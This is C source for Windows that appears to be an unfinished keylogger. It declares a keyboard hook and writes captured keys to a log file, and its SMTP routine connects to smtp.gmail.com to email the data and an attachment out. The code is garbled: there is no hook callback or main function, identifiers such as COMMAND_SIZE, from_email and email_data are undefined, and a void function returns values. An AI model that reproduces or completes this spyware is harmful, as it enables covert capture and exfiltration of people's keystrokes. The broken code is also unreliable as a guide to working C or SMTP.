#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <ctype.h>
#include <windows.h>
#include <winuser.h>
#include <winsock2.h>

#define BUFFER_SIZE 1024

HHOOK keyboard_hook;
char log_file_path[MAX_PATH];
int cancel_key;

void write_to_file(const char *key) {
    FILE *log_file = fopen(log_file_path, "a");
    if (log_file == NULL) {
        perror("Error: ");
        exit(EXIT_FAILURE);
    }

    fprintf(log_file, "%s\n", key);
    fclose(log_file);
}

SOCKET create_socket(const char *host, int port) {
    SOCKET socket_desc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (socket_desc == INVALID_SOCKET) {
        fprintf(stderr, "Could not create socket: %ld\n", WSAGetLastError());
        return INVALID_SOCKET;
    }

    struct hostent *host_info = gethostbyname(host);
    if (host_info == NULL) {
        fprintf(stderr, "Could not resolve host name: %d\n", WSAGetLastError());
        closesocket(socket_desc);
        return INVALID_SOCKET;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr = *((struct in_addr *)host_info->h_addr);
    memset(&(server.sin_zero), '\0', 8);

    int result = connect(socket_desc, (struct sockaddr *)&server, sizeof(server));
    if (result == SOCKET_ERROR) {
        fprintf(stderr, "Could not connect: %d\n", WSAGetLastError());
        closesocket(socket_desc);
        return INVALID_SOCKET;
    }

    return socket_desc;
}

int send_command(SOCKET socket_desc, const char *command) {
    char recv_buffer[BUFFER_SIZE];
    int result = send(socket_desc, command, strlen(command), 0);
    if (result == SOCKET_ERROR) {
        fprintf(stderr, "Could not send command: %d\n", WSAGetLastError());
        return -1;
    }

    result = recv(socket_desc, recv_buffer, BUFFER_SIZE, 0);
    if (result == SOCKET_ERROR) {
        fprintf(stderr, "Could not receive response: %d\n", WSAGetLastError());
        return -1;
    }
    recv_buffer[result] = '\0';

    return atoi(recv_buffer);
}

int receive_response(SOCKET socket_desc, char *buffer, int buffer_size) {
    int result = recv(socket_desc, buffer, buffer_size, 0);
    if (result == SOCKET_ERROR) {
        fprintf(stderr, "Could not receive response: %d\n", WSAGetLastError());
        return -1;
    }
    buffer[result] = '\0';

    return atoi(buffer);
}

void send_email(const char *recipient, const char *subject, const char *body, const char *attachment_path) {
    // Initialize Winsock
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        fprintf(stderr, "WSAStartup failed: %d\n", result);
        return;
    }

    // Create socket
    SOCKET socket_desc = create_socket("smtp.gmail.com", 587);
    if (socket_desc == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    // Receive greeting from SMTP server
    char recv_buffer[BUFFER_SIZE];
    result = recv(socket_desc, recv_buffer, BUFFER_SIZE, 0);
    if (result == SOCKET_ERROR) {
        printf("Error receiving greeting from SMTP server: %d\n", WSAGetLastError());
        return 1;
    }
    recv_buffer[result] = '\0'; // Add null terminator to received string
    printf("SMTP server greeting: %s", recv_buffer);

    // Send EHLO command to SMTP server
    char ehlo_command[COMMAND_SIZE];
    sprintf(ehlo_command, "EHLO %s\r\n", domain);
    result = send(socket_desc, ehlo_command, strlen(ehlo_command), 0);
    if (result == SOCKET_ERROR) {
        printf("Error sending EHLO command to SMTP server: %d\n", WSAGetLastError());
        return 1;
    }

    // Receive response to EHLO command from SMTP server
    result = recv(socket_desc, recv_buffer, BUFFER_SIZE, 0);
    if (result == SOCKET_ERROR) {
        printf("Error receiving response to EHLO command from SMTP server: %d\n", WSAGetLastError());
        return 1;
    }
    recv_buffer[result] = '\0'; // Add null terminator to received string
    printf("SMTP server response to EHLO command: %s", recv_buffer);

    // Send MAIL FROM command to SMTP server
    char mail_from_command[COMMAND_SIZE];
    sprintf(mail_from_command, "MAIL FROM:<%s>\r\n", from_email);
    result = send(socket_desc, mail_from_command, strlen(mail_from_command), 0);
    if (result == SOCKET_ERROR) {
        printf("Error sending MAIL FROM command to SMTP server: %d\n", WSAGetLastError());
        return 1;
    }

    // Receive response to MAIL FROM command from SMTP server
    result = recv(socket_desc, recv_buffer, BUFFER_SIZE, 0);
    if (result == SOCKET_ERROR) {
        printf("Error receiving response to MAIL FROM command from SMTP server: %d\n", WSAGetLastError());
        return 1;
    }
    recv_buffer[result] = '\0'; // Add null terminator to received string
    printf("SMTP server response to MAIL FROM command: %s", recv_buffer);

    // Send RCPT TO command to SMTP server
    char rcpt_to_command[COMMAND_SIZE];
    sprintf(rcpt_to_command, "RCPT TO:<%s>\r\n", to_email);
    result = send(socket_desc, rcpt_to_command, strlen(rcpt_to_command), 0);
    if (result == SOCKET_ERROR) {
        printf("Error sending RCPT TO command to SMTP server: %d\n", WSAGetLastError());
        return 1;
    }

    // Receive response to RCPT TO command from SMTP server
    result = recv(socket_desc, recv_buffer, BUFFER_SIZE, 0);
    if (result == SOCKET_ERROR) {
        printf("Error receiving response to RCPT TO command from SMTP server: %d\n", WSAGetLastError());
        return 1;
    }
    recv_buffer[result] = '\0'; // Add null terminator to received string
    printf("SMTP server response to RCPT TO command: %s", recv_buffer);

    // Send DATA command to SMTP server
    char data_command[COMMAND_SIZE];
    strcpy(data_command, "DATA\r\n");
    result = send(socket_desc, data_command, strlen(data_command), 0);
    if (result == SOCKET_ERROR) {
        printf("Error sending DATA command to SMTP server: %d\n", WSAGetLastError());
        return 1;
    }

    // Receive response to DATA command from SMTP server
    result = recv(socket_desc, recv_buffer, BUFFER_SIZE, 0);
   if (result == SOCKET_ERROR) {
    printf("Error receiving response to DATA command: %d\n", WSAGetLastError());
    closesocket(socket_desc);
    WSACleanup();
    return 1;
    }

    // Check if response code is 354
    if (strncmp(recv_buffer, "354", 3) != 0) {
    printf("Unexpected response to DATA command: %s\n", recv_buffer);
    closesocket(socket_desc);
    WSACleanup();
    return 1;
    }

    // Send email data to SMTP server
    result = send(socket_desc, email_data, strlen(email_data), 0);
    if (result == SOCKET_ERROR) {
    printf("Error sending email data: %d\n", WSAGetLastError());
    closesocket(socket_desc);
    WSACleanup();
    return 1;
    }

    // Receive response to email data from SMTP server
    result = recv(socket_desc, recv_buffer, BUFFER_SIZE, 0);
    if (result == SOCKET_ERROR) {
    printf("Error receiving response to email data: %d\n", WSAGetLastError());
    closesocket(socket_desc);
    WSACleanup();
    return 1;
    }

    // Check if response code is 250
    if (strncmp(recv_buffer, "250", 3) != 0) {
    printf("Unexpected response to email data: %s\n", recv_buffer);
    closesocket(socket_desc);
    WSACleanup();
    return 1;
    }

    // Send QUIT command to SMTP server
    result = send(socket_desc, "QUIT\r\n", strlen("QUIT\r\n"), 0);
    if (result == SOCKET_ERROR) {
    printf("Error sending QUIT command: %d\n", WSAGetLastError());
    closesocket(socket_desc);
    WSACleanup();
    return 1;
    }

    // Receive response to QUIT command from SMTP server
    result = recv(socket_desc, recv_buffer, BUFFER_SIZE, 0);
    if (result == SOCKET_ERROR) {
    printf("Error receiving response to QUIT command: %d\n", WSAGetLastError());
    closesocket(socket_desc);
    WSACleanup();
    return 1;
    }

    // Check if response code is 221
    if (strncmp(recv_buffer, "221", 3) != 0) {
    printf("Unexpected response to QUIT command: %s\n", recv_buffer);
    closesocket(socket_desc);
    WSACleanup();
    return 1;
    }

    // Close socket and clean up Winsock
    closesocket(socket_desc);
    WSACleanup();

    printf("Email sent successfully.\n");

    return 0;
    }

